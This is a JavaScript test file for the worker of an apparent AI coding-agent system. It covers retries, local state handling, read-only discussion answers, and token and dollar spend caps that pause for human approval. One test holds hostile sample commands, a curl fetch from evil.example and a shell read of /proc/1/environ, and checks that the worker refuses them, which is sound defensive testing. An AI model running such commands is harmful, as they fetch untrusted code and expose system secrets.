import test from 'node:test';
import assert from 'node:assert/strict';
import {
  mkdtemp,
  readFile,
  stat,
  utimes,
  writeFile,
  rm,
  tmpdir,
  join,
  createWorker,
  createState,
  installedProfile,
  BudgetExceededError,
  repository,
  fixture,
} from './helpers/worker-fixture.mjs';

// Worker : suivi des tâches, état local, discussions et plafonds de dépense.

test('a follow-up failure on one task is retried later and never blocks the queue', async t => {
  const f = await fixture(t);
  await f.state.put({ id: 'stuck-job', projectId: f.project.id, cardId: f.card.id, repository, phase: 'merging' });
  let polled = 0,
    pulls = 0;
  const run = {
    id: 'stuck-job',
    delivery: 'github',
    projectId: f.project.id,
    cardId: f.card.id,
    repository,
    state: 'merging',
    submissions: [{ pullRequest: { number: 9, headSha: 'a'.repeat(40) } }],
    exchanges: [],
  };
  const worker = createWorker(f.config, {
    ...f.dependencies,
    github: {
      ...f.github,
      pull: async () => {
        pulls++;
        // Dépôt renommé : GitHub redirige, ce que le client refuse.
        throw new TypeError('fetch failed');
      },
    },
    site: {
      ...f.site,
      history: async () => [run],
      queue: async () => {
        polled++;
        return [];
      },
    },
  });
  assert.equal((await worker.tick()).status, 'idle');
  assert.equal(polled, 1, 'La file des autres cartes est servie.');
  const saved = await f.state.get('stuck-job');
  assert.equal(saved.followUp.failures, 1);
  assert.match(saved.followUp.error, /fetch failed/);
  assert.ok(saved.followUp.retryAfter > Date.now());
  await worker.tick();
  assert.equal(pulls, 1, 'La tâche en erreur attend avant un nouvel essai.');
  assert.equal(f.logs.filter(line => line.includes('suivi impossible')).length, 1);
});

test('the worker runs its installed preset commands, whatever commands the site sends', () => {
  const site = {
    preset: 'planifikateur',
    branch: 'develop',
    installCommands: [['curl', 'https://evil.example/x.sh']],
    testCommands: [['sh', '-c', 'cat /proc/1/environ']],
    workflow: { file: 'evil.yml', name: 'Evil', jobs: ['x'] },
  };
  const profile = installedProfile(site);
  assert.equal(profile.branch, 'develop');
  assert.deepEqual(profile.installCommands, [['npm', 'ci']]);
  assert.equal(profile.workflow.file, 'ci.yml');
  assert.ok(!JSON.stringify(profile).includes('evil'));
  assert.throws(() => installedProfile({ preset: 'inconnu' }), /Profil/);
});

test('a corrupt local state file is set aside without blocking the other tasks', async t => {
  const root = await mkdtemp(join(tmpdir(), 'planifikateur-state-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  const logs = [];
  const state = createState(root, { log: message => logs.push(message) });
  await state.put({ id: 'healthy-job', phase: 'merging' });
  await writeFile(join(root, 'state', 'broken-job.json'), '{"id":"broken-job","phase":');
  assert.deepEqual(await state.all(), [{ id: 'healthy-job', phase: 'merging' }]);
  assert.equal(await state.get('broken-job'), null);
  assert.equal(await readFile(join(root, 'state', 'broken-job.json.corrupt'), 'utf8'), '{"id":"broken-job","phase":');
  assert.ok(logs.some(line => line.includes('broken-job : état local illisible')));
});

test('finished local states are purged after a week, while open tasks and recent ones stay', async t => {
  const root = await mkdtemp(join(tmpdir(), 'planifikateur-state-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  const state = createState(root);
  for (const [id, phase] of [
    ['old-done', 'done'],
    ['old-cancelled', 'cancelled'],
    ['old-merging', 'merging'],
    ['recent-done', 'done'],
  ])
    await state.put({ id, phase });
  await writeFile(join(root, 'state', 'old-broken.json.corrupt'), '{');
  const week = 7 * 24 * 3600000,
    old = new Date(Date.now() - week - 60000);
  for (const name of ['old-done.json', 'old-cancelled.json', 'old-merging.json', 'old-broken.json.corrupt'])
    await utimes(join(root, 'state', name), old, old);
  assert.equal(await state.prune(), 3);
  assert.deepEqual((await state.all()).map(job => job.id).sort(), ['old-merging', 'recent-done']);
  await assert.rejects(stat(join(root, 'state', 'old-broken.json.corrupt')), { code: 'ENOENT' });
  assert.equal(await state.prune({ now: Date.now() + week + 60000 }), 1, 'Une tâche récente part à son tour.');
});

test('a task interrupted on the site is no longer running locally, so a worker update is not held back', async t => {
  const f = await fixture(t, {
    model: async () => {
      throw new Error('Modèle indisponible');
    },
  });
  assert.equal((await f.worker.processTask(f.prepare())).status, 'interrupted');
  assert.equal(f.current().state, 'interrupted');
  const job = await f.state.get(f.current().id);
  assert.equal(job.phase, 'interrupted');
  // Worker arrêté avant d’avoir enregistré l’arrêt : l’état local est resté « running ».
  await f.state.put({ ...job, phase: 'running' });
  await f.worker.tick();
  assert.equal((await f.state.get(job.id)).phase, 'interrupted');
});

test('a Discussion question is answered in its card from a read-only copy, without branch, push or PR', async t => {
  const f = await fixture(t, {
    model: async input => {
      assert.equal(input.run.mode, 'discussion');
      assert.match(await readFile(join(input.cwd, 'greet.mjs'), 'utf8'), /hello/);
      const last = input.run.conversation.at(-1)?.text || input.run.objective;
      return { status: 'result', summary: `Réponse à : ${last}`, question: '', files: [] };
    },
  });
  const listId = `${f.project.id}-discussion`;
  const question = {
    id: 'question',
    listId,
    title: 'Salutation',
    description: 'Que renvoie greet ?',
    status: 'draft',
    priority: 'normal',
    tags: [],
    comments: [],
    checklist: [],
  };
  f.store.change([{ type: 'card.create', projectId: f.project.id, card: question }], f.user, { strict: true });
  const card = () =>
    f.store
      .read()
      .projects.find(project => project.id === f.project.id)
      .cards.find(item => item.id === 'question');
  assert.equal((await f.worker.tick()).status, 'answered');
  assert.deepEqual(
    card().comments.map(comment => [comment.authorKind, comment.text]),
    [['agent', 'Réponse à : Que renvoie greet ?']],
  );
  // Une relance en commentaire reçoit sa propre réponse ; sans nouveau message, rien n’est relancé.
  f.store.change(
    [
      {
        type: 'comment.create',
        projectId: f.project.id,
        cardId: 'question',
        comment: { id: 'r1', text: 'Et en anglais ?' },
      },
    ],
    f.user,
    { strict: true },
  );
  assert.equal((await f.worker.tick()).status, 'answered');
  assert.equal((await f.worker.tick()).status, 'idle');
  assert.equal(card().comments.at(-1).text, 'Réponse à : Et en anglais ?');
  assert.equal(card().status, 'draft');
  assert.equal(card().listId, listId);
  assert.equal(f.modelCalls.length, 2);
  assert.equal(f.pr, undefined);
  assert.ok(!f.calls.some(call => ['push', 'checkout', 'commit'].includes(call.command[1])));
  const runs = f.store.workflows.list(f.project.id, 'question');
  assert.deepEqual(
    runs.map(run => [run.mode, run.state]),
    [
      ['discussion', 'done'],
      ['discussion', 'done'],
    ],
  );
});

test('worker asks on the card instead of calling the model again once the execution reaches its token cap', async t => {
  const f = await fixture(t, {
    model: async (input, count) => {
      if (count === 1) {
        input.onUsage({ inputTokens: 25000000, cachedInputTokens: 20000000, outputTokens: 1000 });
        throw new Error('Codex interrompu');
      }
      await writeFile(join(input.cwd, 'greet.mjs'), "export const greet = () => 'bonjour';\n");
      return { status: 'result', summary: 'Traduction prête.', question: '' };
    },
  });
  const run = f.prepare();
  assert.equal((await f.worker.tick()).status, 'interrupted');
  const job = await f.state.get(run.id);
  delete job.retryAfter;
  await f.state.put(job);
  assert.equal((await f.worker.tick()).status, 'waiting', f.logs.join('\n'));
  assert.equal(f.modelCalls.length, 1, 'plafond atteint : pas de nouvel appel au modèle');
  const waiting = f.current();
  assert.match(
    waiting.exchanges.at(-1).question,
    /^Plafond de consommation IA atteint pour cette exécution : 25 millions de tokens depuis le début de l’exécution, pour un plafond de 20 millions/,
  );
  // La réponse sur la carte accorde une nouvelle tranche.
  f.store.workflows.human(
    f.project.id,
    f.card.id,
    waiting.id,
    'answer',
    { version: waiting.version, message: 'Continue.' },
    f.user,
  );
  assert.equal((await f.worker.tick()).status, 'merging', f.logs.join('\n'));
  assert.equal(f.modelCalls.length, 2);
});

test('a Claude Code call stopped at the spend cap becomes a question on the card with its cost', async t => {
  const f = await fixture(t);
  f.store.workflows.configureAi(f.project.id, { engine: 'claude-code', model: 'sonnet' }, f.user);
  const budgets = [];
  const claude = {
    async run(input) {
      budgets.push(input.maxBudgetUsd);
      await input.onThread('claude-thread');
      if (budgets.length === 1) {
        input.onUsage({ inputTokens: 1000, outputTokens: 100, costUsd: 10.25 });
        throw new BudgetExceededError();
      }
      await writeFile(join(input.cwd, 'greet.mjs'), "export const greet = () => 'bonjour';\n");
      return { status: 'result', summary: 'Traduction prête.', question: '', files: [] };
    },
  };
  const worker = createWorker(f.config, { ...f.dependencies, claude });
  f.prepare();
  assert.equal((await worker.tick()).status, 'waiting', f.logs.join('\n'));
  const waiting = f.current();
  assert.match(
    waiting.exchanges.at(-1).question,
    /^Plafond de dépense IA atteint pour cette exécution : 10,25 \$ estimés depuis le début de l’exécution, pour un plafond de 10,00 \$/,
  );
  assert.equal(waiting.usage.costUsd, 10.25);
  f.store.workflows.human(
    f.project.id,
    f.card.id,
    waiting.id,
    'answer',
    { version: waiting.version, message: 'Continue.' },
    f.user,
  );
  assert.equal((await worker.tick()).status, 'merging', f.logs.join('\n'));
  assert.deepEqual(budgets, [10, 10]);
});
